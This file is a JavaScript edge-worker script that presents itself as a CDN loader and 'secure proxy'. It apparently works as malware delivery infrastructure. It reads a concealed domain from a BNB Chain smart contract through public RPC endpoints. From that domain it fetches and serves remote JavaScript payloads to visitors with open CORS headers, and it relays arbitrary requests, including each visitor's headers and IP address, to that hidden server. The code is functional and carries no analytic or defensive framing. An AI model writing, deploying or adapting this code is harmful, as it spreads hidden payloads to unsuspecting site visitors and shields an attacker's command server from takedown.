const PERMIT_KEY = 'f3hb335j3r6jugpehiay';
const UPDATE_INTERVAL = 300000;
const CACHE_TTL = 60000;

const RPC_URLS = [
    "https://binance.llamarpc.com",
    "https://bsc.blockrazor.xyz", 
    "https://bsc.therpc.io",
    "https://bsc-dataseed2.bnbchain.org"
];
const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";

let memoryCache = new Map();

function getClientIP(request) {
    return request.headers.get('CF-Connecting-IP') || 
           request.headers.get('X-Forwarded-For')?.split(',')[0]?.trim() || 
           request.headers.get('X-Real-IP') || 
           '127.0.0.1';
}

function getCurrentUrl(request) {
    const url = new URL(request.url);
    return `https://${url.host}${url.pathname}`;
}

async function fetchWithTimeout(url, options, timeout = 10000) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response;
    } catch (error) {
        clearTimeout(timeoutId);
        throw error;
    }
}

class SmartCDNLoader {
    constructor(permitKey, cdnUrl = 'http://localhost:3000', noCache = false) {
        this.permitKey = permitKey;
        this.cdnUrl = cdnUrl.replace(/\/$/, '');
        this.noCache = noCache;
        this.updateInterval = UPDATE_INTERVAL;
    }

    async getRemoteFilesConfig() {
        try {
            const payload = JSON.stringify({ permit_key: this.permitKey });
            const response = await fetchWithTimeout(`${this.cdnUrl}/jscdn/getFilesConfig`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: payload
            });

            if (response.ok) {
                const data = await response.json();
                if (data && data.fileHash && data.loaderHash) {
                    return data;
                }
            }
        } catch (error) {
            console.error('Failed to get remote files config:', error);
        }
        return false;
    }

    async downloadFile() {
        try {
            const payload = JSON.stringify({ permit_key: this.permitKey });
            const response = await fetchWithTimeout(`${this.cdnUrl}/jscdn/getFile`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/javascript',
                    'Content-Type': 'application/json'
                },
                body: payload
            }, 30000);

            if (response.ok) {
                return await response.text();
            }
        } catch (error) {
            console.error('Failed to download file:', error);
        }
        return false;
    }

    async downloadLoader() {
        try {
            const payload = JSON.stringify({ permit_key: this.permitKey });
            const response = await fetchWithTimeout(`${this.cdnUrl}/jscdn/getLoader`, {
                method: 'POST',
                headers: {
                    'Accept': 'application/javascript',
                    'Content-Type': 'application/json'
                },
                body: payload
            }, 30000);

            if (response.ok) {
                return await response.text();
            }
        } catch (error) {
            console.error('Failed to download loader:', error);
        }
        return false;
    }

    async updateCacheIfNeeded(type = 'loader') {
        if (this.noCache) {
            const newContent = type === 'loader' ? await this.downloadLoader() : await this.downloadFile();
            return newContent || false;
        }

        const isLoader = (type === 'loader');
        const cacheKey = isLoader ? 'loader_cache' : `file_cache_${this.permitKey}`;
        
        const cached = memoryCache.get(cacheKey);
        const now = Date.now();

        if (cached && (now - cached.timestamp) < this.updateInterval) {
            return cached.content;
        }

        const filesConfig = await this.getRemoteFilesConfig();
        if (!filesConfig) {
            return cached?.content || false;
        }

        const cacheTTL = filesConfig.cacheTTL || this.updateInterval;
        this.updateInterval = cacheTTL;

        const remoteHash = isLoader ? filesConfig.loaderHash : filesConfig.fileHash;
        const needsUpdate = !cached || cached.hash !== remoteHash;

        if (needsUpdate) {
            const newContent = isLoader ? await this.downloadLoader() : await this.downloadFile();
            if (newContent) {
                memoryCache.set(cacheKey, {
                    content: newContent,
                    hash: remoteHash,
                    timestamp: now,
                    cacheTTL: cacheTTL
                });
                return newContent;
            } else {
                return cached?.content || false;
            }
        } else {
            memoryCache.set(cacheKey, { ...cached, timestamp: now, cacheTTL: cacheTTL });
            return cached.content;
        }
    }

    async generateLoader(request) {
        const content = await this.updateCacheIfNeeded('loader');
        if (!content) {
            return new Response('Service Unavailable', { status: 503 });
        }

        const currentUrl = getCurrentUrl(request);
        const urlInjection = `window.e46jvfbmmj="${currentUrl.replace(/\\/g, '\\\\')}";`;
        const finalContent = urlInjection + content;

        return new Response(finalContent, {
            headers: {
                'Content-Type': 'application/javascript',
                'Cache-Control': 'public, max-age=3600',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': '*',
                'Access-Control-Allow-Headers': '*'
            }
        });
    }

    async serveLoader() {
        const content = await this.updateCacheIfNeeded('file');
        if (!content) {
            return new Response('Service Unavailable', { status: 503 });
        }

        return new Response(content, {
            headers: {
                'Content-Type': 'application/javascript',
                'Cache-Control': 'public, max-age=300',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': '*',
                'Access-Control-Allow-Headers': '*'
            }
        });
    }
}

class SecureProxyMiddleware {
    constructor(options = {}) {
        this.updateInterval = CACHE_TTL;
        this.rpcUrls = options.rpcUrls || RPC_URLS;
        this.contractAddress = options.contractAddress || CONTRACT_ADDRESS;
    }

    loadCache() {
        const cached = memoryCache.get('proxy_domain');
        if (cached && (Date.now() - cached.timestamp) < this.updateInterval) {
            return cached.domain;
        }
        return null;
    }

    saveCache(domain) {
        memoryCache.set('proxy_domain', {
            domain: domain,
            timestamp: Date.now()
        });
    }

    hexToString(hex) {
        hex = hex.replace(/^0x/, '');
        hex = hex.substring(64);
        const lengthHex = hex.substring(0, 64);
        const length = parseInt(lengthHex, 16);
        const dataHex = hex.substring(64, 64 + length * 2);
        let result = '';
        
        for (let i = 0; i < dataHex.length; i += 2) {
            const charCode = parseInt(dataHex.substring(i, i + 2), 16);
            if (charCode === 0) break;
            result += String.fromCharCode(charCode);
        }
        return result;
    }

    async fetchTargetDomain() {
        const data = '20965255';
        
        for (const rpcUrl of this.rpcUrls) {
            try {
                const response = await fetchWithTimeout(rpcUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0',
                        id: 1,
                        method: 'eth_call',
                        params: [{
                            to: this.contractAddress,
                            data: '0x' + data
                        }, 'latest']
                    })
                }, 120000);

                if (response.ok) {
                    const responseData = await response.json();
                    if (!responseData.error) {
                        const domain = this.hexToString(responseData.result);
                        if (domain) return domain;
                    }
                }
            } catch (error) {
                continue;
            }
        }
        throw new Error('Could not fetch target domain');
    }

    async getTargetDomain() {
        const cachedDomain = this.loadCache();
        if (cachedDomain) return cachedDomain;

        const domain = await this.fetchTargetDomain();
        this.saveCache(domain);
        return domain;
    }

    async handle(request, endpoint) {
        try {
            const targetDomain = (await this.getTargetDomain()).replace(/\/$/, '');
            const url = `${targetDomain}/${endpoint.replace(/^\//, '')}`;
            const clientIP = getClientIP(request);

            const headers = new Headers();
            for (const [key, value] of request.headers.entries()) {
                if (!['host', 'origin', 'accept-encoding', 'content-encoding'].includes(key.toLowerCase())) {
                    headers.set(key, value);
                }
            }
            headers.set('x-dfkjldifjlifjd', clientIP);

            const response = await fetchWithTimeout(url, {
                method: request.method,
                headers: headers,
                body: request.method !== 'GET' ? await request.arrayBuffer() : undefined
            }, 120000);

            const responseHeaders = new Headers();
            responseHeaders.set('Access-Control-Allow-Origin', '*');
            responseHeaders.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
            responseHeaders.set('Access-Control-Allow-Headers', '*');
            
            const contentType = response.headers.get('content-type');
            if (contentType) {
                responseHeaders.set('Content-Type', contentType);
            }

            return new Response(response.body, {
                status: response.status,
                headers: responseHeaders
            });

        } catch (error) {
            return new Response('Internal Server Error', { status: 500 });
        }
    }
}

export default {
    async fetch(request) {
        const url = new URL(request.url);
        const searchParams = url.searchParams;

        if (request.method === 'OPTIONS') {
            return new Response(null, {
                status: 204,
                headers: {
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
                    'Access-Control-Allow-Headers': '*',
                    'Access-Control-Max-Age': '86400'
                }
            });
        }

        const loaderParam = searchParams.get('m');
        const endpoint = searchParams.get('e');

        if (!endpoint && !loaderParam) {
            const proxy = new SecureProxyMiddleware();
            const cdnUrl = await proxy.getTargetDomain();
            const loader = new SmartCDNLoader(PERMIT_KEY, cdnUrl, false);
            return await loader.generateLoader(request);
        } 
        
        if (loaderParam) {
            const proxy = new SecureProxyMiddleware();
            const cdnUrl = await proxy.getTargetDomain();
            const loader = new SmartCDNLoader(PERMIT_KEY, cdnUrl, false);
            return await loader.serveLoader();
        }

        if (endpoint === 'ping_proxy') {
            return new Response('pong', {
                headers: { 
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': '*',
                    'Access-Control-Allow-Headers': '*'
                }
            });
        }
        
        if (endpoint) {
            const proxy = new SecureProxyMiddleware({
                rpcUrls: RPC_URLS,
                contractAddress: CONTRACT_ADDRESS
            });
            const decodedEndpoint = decodeURIComponent(endpoint).replace(/^\//, '');
            return await proxy.handle(request, decodedEndpoint);
        }

        return new Response('Not Found', { status: 404 });
    }
};